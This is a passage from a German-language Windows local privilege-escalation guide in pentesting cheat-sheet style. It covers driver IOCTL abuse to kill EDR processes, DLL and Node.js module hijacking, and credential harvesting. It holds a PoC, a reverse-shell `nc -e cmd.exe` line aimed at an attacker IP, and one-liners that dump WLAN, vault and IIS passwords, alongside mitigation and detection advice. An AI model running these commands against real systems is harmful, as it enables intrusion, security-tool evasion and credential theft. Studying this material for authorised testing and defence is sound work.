Ein starkes Suchmuster: **heterogene Registry-Lesezugriffe in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, bei denen der erste Registry-Lesezugriff bestimmt, ob ein zweiter stattfindet.

#### Ausnutzen von fehlendem FILE_DEVICE_SECURE_OPEN bei Geräteobjekten (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Geräteobjekt mit einer starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL beim Öffnen des Geräts über einen Pfad mit einer zusätzlichen Komponente nicht durchgesetzt. Dadurch kann jeder nicht privilegierte Benutzer über einen Namespace-Pfad wie diesen ein Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation missbrauchen. In freier Wildbahn beobachtete Möglichkeiten:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Raw-Disk-Lese-/Schreibzugriff (Offline-Manipulation, Tricks für Persistenz beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), und so AV/EDR aus dem User Mode über den Kernel beenden.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigationsmaßnahmen für Entwickler
- Setze beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Überprüfe den Kontext des Aufrufers bei privilegierten Vorgängen. Führe PP/PPL-Prüfungen durch, bevor du das Beenden von Prozessen oder die Rückgabe von Handles erlaubst.
- Beschränke IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehe brokerbasierte Modelle anstelle direkter Kernel-Privilegien in Betracht.

Erkennungsideen für Verteidiger
- Überwache das Öffnen verdächtiger Gerätenamen im User Mode (z. B. \\ .\\amsdk*) sowie bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setze Microsofts Liste blockierter anfälliger Treiber durch (HVCI/WDAC/Smart App Control) und pflege eigene Allow-/Deny-Listen.


## PATH DLL Hijacking

Wenn du **Schreibrechte in einem Ordner hast, der in PATH enthalten ist**, kannst du möglicherweise eine von einem Prozess geladene DLL hijacken und **deine Privilegien erhöhen**.<sup>[[2]](#references)</sup>

Überprüfe die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie dieser Check missbraucht werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js- / Electron-Modulauflösungs-Hijacking über `C:\node_modules`

Dies ist eine **Windows-Variante mit unkontrolliertem Suchpfad**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Pakete auf, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis nach `node_modules`-Ordnern sucht. Unter Windows kann dieser Suchlauf bis zum Laufwerksstamm reichen. Eine Anwendung, die aus `C:\Users\Administrator\project\app.js` gestartet wird, kann daher Folgendes prüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit geringen Berechtigungen** `C:\node_modules` erstellen kann, kann er dort eine schädliche `foo.js` (oder einen Paketordner) ablegen und warten, bis ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht eine **LPE**, sobald das Ziel als Administrator, über eine Task oder einen Dienst-Wrapper mit erhöhten Berechtigungen oder in einer automatisch gestarteten privilegierten Desktop-App ausgeführt wird.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- sich das anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode befindet

### Anfällige Ziele finden

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = Zieldatei (`node.exe`, die Electron-App-EXE oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Achte auf `NAME NOT FOUND` und das abschließende erfolgreiche Öffnen unter `C:\node_modules`

Nützliche Muster für Code-Reviews in entpackten `.asar`-Dateien oder Anwendungsquellen:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder einer Quellcodeprüfung.
2. Erstelle das Root-Lookup-Verzeichnis, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Platzieren Sie ein Modul mit dem exakt erwarteten Namen:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Anwendung des Opfers aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Beispiele aus der Praxis für fehlende optionale Module, die diesem Muster entsprechen, sind `bluebird` und `utf-8-validate`. Die **Technik** ist jedoch der wiederverwendbare Teil: Suchen Sie nach einem beliebigen **fehlenden Bare Import**, den ein privilegierter Windows-Node-/Electron-Prozess auflösen wird.

### Erkennung und Härtung

- Lösen Sie einen Alarm aus, wenn ein Benutzer `C:\node_modules` erstellt oder neue `.js`-Dateien bzw. Pakete dort ablegt.
- Suchen Sie nach Prozessen mit hoher Integrität, die auf `C:\node_modules\*` zugreifen.
- Verpacken Sie alle Laufzeitabhängigkeiten für den Produktionseinsatz und prüfen Sie die Verwendung von `optionalDependencies`.
- Prüfen Sie Drittanbietercode auf stille Muster wie `try { require("...") } catch {}`.
- Deaktivieren Sie optionale Prüfungen, sofern die Bibliothek dies unterstützt (beispielsweise können manche `ws`-Installationen die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` umgehen).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts-Datei

Prüfen Sie, ob weitere bekannte Computer in der hosts-Datei fest eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Für einen lokalen listener sollten Sie seine PID mit dem Prozesseigentümer, dem Pfad der ausführbaren Datei und dem Dienst oder geplanten Task abgleichen, der ihn startet. Ein Remote-Control-Dienst kann nur dann Zugriff als sein Desktopbenutzer gewähren, wenn seine Authentifizierung und Befehlssteuerung dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die mit einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Weg zur Speicherkorruption eine Analyse genau dieser Binärdatei und ihrer erreichbaren Eingaben erfordert. Scheint ein offener Port zu einem Systemprozess zu gehören, vergleichen Sie ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor Sie den Backend-Dienst zuordnen; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um Firewalls**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere[ Befehle zur Netzwerkerkennung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows-Subsystem für Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn Sie root user erhalten, können Sie auf jedem Port lauschen (wenn Sie `nc.exe` zum ersten Mal zum Lauschen auf einem Port verwenden, werden Sie über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um bash einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden.

Linux-`root` innerhalb von WSL verleiht für sich genommen keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität das Dateisystem einer Distribution lesen kann, überprüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Zugangsdaten gespeichert wurden. Für eine Rechteausweitung sind weiterhin ein gültiges Konto mit höheren Rechten und ein zulässiger Authentifizierungsweg erforderlich. Die Struktur `LocalState\rootfs` gilt für ältere WSL-Installationen; WSL 2 speichert die Distribution häufig auf einer virtuellen Festplatte namens [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Gib bei automatisierten Enumeration-Vorgängen keine Verlaufsinhalte aus.

## Windows-Anmeldedaten

### Winlogon-Anmeldedaten

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` und `DefaultDomainName` als Kontokontext, nicht als Anmeldedaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextfund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA-Geheimnis speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Lesezugriffe belegen weder, ob dieses Geheimnis existiert, noch ob es abgerufen werden kann. Prüfen Sie die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor Sie eine Offenlegung von Anmeldedaten melden.

### Anmeldeinformationsverwaltung / Windows Vault

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldedaten für Server, Websites und andere Programme, mit denen sich **Windows** **Benutzer automatisch anmelden** kann. Auf den ersten Blick klingt es vielleicht so, als könnten Benutzer Anmeldedaten für Websites wie Facebook, Twitter oder Gmail speichern und sich von Browsern automatisch anmelden lassen. So funktioniert es jedoch nicht.

Windows Vault speichert Anmeldedaten, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldedaten für den Zugriff auf eine Ressource** (einen Server oder eine Website) benötigt, **diese Credential Manager & Windows Vault nutzen** und die bereitgestellten Anmeldedaten verwenden kann, anstatt dass Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben müssen.

Sofern die Anwendungen nicht mit Credential Manager interagieren, können sie meiner Meinung nach die Anmeldedaten für eine bestimmte Ressource nicht verwenden. Wenn Ihre Anwendung also den Vault nutzen soll, muss sie irgendwie **mit Credential Manager kommunizieren und die Anmeldedaten für diese Ressource** beim standardmäßigen Vault-Speicher abrufen.

Verwenden Sie `cmdkey`, um die gespeicherten Anmeldedaten auf dem Computer aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dann kannst du `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachten Sie mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire-Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstoken und Passwörter im Klartext im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ entschlüsselt werden, ohne dass administrative Rechte oder `SeDebugPrivilege` erforderlich sind.

Führen Sie diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Passwörter im Klartext zu dumpen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um wesentlich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden dafür die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Mit DPAPI verschlüsselte RSA-Benutzerschlüssel werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der sich zusammen mit dem Hauptschlüssel zum Schutz der privaten Schlüssel des Benutzers in derselben Datei befindet**, besteht in der Regel aus 64 Byte zufälliger Daten. (Beachte, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist. Daher lässt sich sein Inhalt in CMD nicht mit dem Befehl `dir` auflisten, in PowerShell jedoch schon.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz-Modul** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) entschlüsseln.

Die **durch das Masterpasswort geschützten Anmeldedatendateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele DPAPI-**masterkeys** aus dem **Speicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldedaten

**PowerShell-Anmeldedaten** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldedaten bequem zu speichern. Die Anmeldedaten werden mit **DPAPI** geschützt. Das bedeutet normalerweise, dass sie nur vom selben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldedatendatei kann einen beliebigen Dateinamen oder `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventarisierung auf eine solche Datei verweist, ermittle das tatsächliche Profilverzeichnis des Kontos, anstatt `C:\Users` anzunehmen: [Windows kann Profile an anderen Speicherorten ablegen](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss außerdem über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfe zuerst Pfade und ACLs, ohne bei der routinemäßigen Inventarisierung verschlüsselte oder Klartextwerte auszugeben.

Um PowerShell-Anmeldedaten aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes ausführen:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Du findest sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Zuletzt ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Verwende das Mimikatz-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` kannst du **viele DPAPI-Masterkeys aus dem Arbeitsspeicher extrahieren**

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuche lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Benutzerordnern, einschließlich Dateien mit gewöhnlichen Namen wie `config.xml`. Ermittle das Verbindungsschema und die verschlüsselten `Password`-Attribute, bevor du eine XML-Datei als mögliche Quelle für Zugangsdaten behandelst. Der gespeicherte Wert ist kein DPAPI-/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Master-Passwort verwendet wurde. Vermeide es, verschlüsselte Werte bei einer umfassenden Suche auszugeben.

**Remote Desktop Plus-Profil-Exporte** können ebenfalls in Benutzerordnern oder einem gemeinsamen Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Behandle ein nicht leeres Passwortelement als möglichen Hinweis auf Zugangsdaten, ohne es auszugeben oder davon auszugehen, dass es im Klartext vorliegt: [Der Hersteller weist darauf hin](https://www.donkz.nl/), dass der Profilschutz an das erstellende Konto und den Computer gebunden oder weniger strikt konfiguriert sein kann. Überprüfe die Herkunft der Datei und die Bedingungen für die Wiederherstellung, bevor du dich darauf verlässt.

### Sticky Notes

Manchmal speichern Nutzer Passwörter und andere Informationen in Notiz-Apps. Die mit Microsoft ausgelieferte Sticky Notes-App speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermittle die installierte App und das Speicherformat, bevor du aus einer fehlenden SQLite-Datei auf fehlende Notizen schließt.

Wenn Sticky Notes SQLite Write-Ahead Logging verwendet, enthält eine Kopie von `plum.sqlite` allein möglicherweise nicht alle zuletzt bestätigten Notizen. Bewahre `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und nimm, sofern verfügbar, auch `plum.sqlite-shm` dazu; der Shared-Memory-Index kann neu erstellt werden, aber das WAL ist Teil des persistenten Zustands der Datenbank. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein möglicher Hinweis auf Zugangsdaten: Überprüfe das Konto, den erlaubten Zugriff und die Wiederverwendung des Passworts separat. Ein verschlüsselter Eintrag in einem Passwort-Manager erfordert außerdem den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er eine Anmeldung mit höheren Berechtigungen belegen kann.

### AppCmd.exe

**Beachte, dass du Administrator sein und mit einer hohen Integritätsstufe arbeiten musst, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei existiert, wurden möglicherweise **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installationsprogramme werden **mit SYSTEM-Berechtigungen ausgeführt**; viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Anmeldedaten)

### Anmeldedaten-Artefakte in der Registry von Support-Tools

Einige ältere Fernsupport-Installationen behalten passwortbezogene Wertnamen unter festen Anwendungs-Registry-Schlüsseln bei. Beispielsweise bezeichnete `SecurityPasswordAES` von TeamViewer laut [Erklärung des Herstellers zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort. Ein Wertnamen-Marker ist lediglich ein Hinweis für die Überprüfung: Verifizieren Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie dieses Anmeldedatum bewerten. Der Wechsel von einem Fernsupport-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und Sie für dieses Konto autorisiert sind. Geben Sie Chiffretext und wiederhergestellte Passwörter nicht in routinemäßigen Enumerierungsausgaben aus.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn Sie vermuten, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Arbeitsblattschutz oder ausgeblendeten Spalten. [Microsoft erklärt](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung einschränkt und kein Sicherheitsfeature ist; er belegt für sich genommen nicht, dass der Inhalt der Arbeitsmappe verschlüsselt ist. Prüfen Sie nur autorisierte, relevante Dateien und vermeiden Sie es, bei einer breit angelegten Enumerierung mögliche Geheimnisse auszugeben. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Anmeldedaten vorhanden sind, noch, dass ein Konto höhere Rechte besitzt; überprüfen Sie die tatsächlichen Daten und die aktuellen Kontorechte separat.

### Vom CI-Server gespeicherte Änderungs-Patches

Ein CI-Server kann eingereichte Quellcodeänderungen auch nach Abschluss des Builds in seinem Datenverzeichnis aufbewahren. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Remote-Run-Änderungen; das Datenverzeichnis kann konfiguriert werden und befindet sich nicht unbedingt unter `ProgramData`. Ein lesbarer Patch kann Verweise auf eine Anmeldedatendatei, einen Verschlüsselungsschlüssel oder ein Skript, das beides verwendet, enthalten, selbst wenn diese Verweise entfernt oder hinzugefügt wurden. Ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` benötigt beispielsweise sowohl den AES-Schlüssel als auch den verschlüsselten String; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat bereitgestellt wird. Prüfen Sie zunächst nur zugängliche Patch-Namen und anschließend unter entsprechender Autorisierung relevante Inhalte, 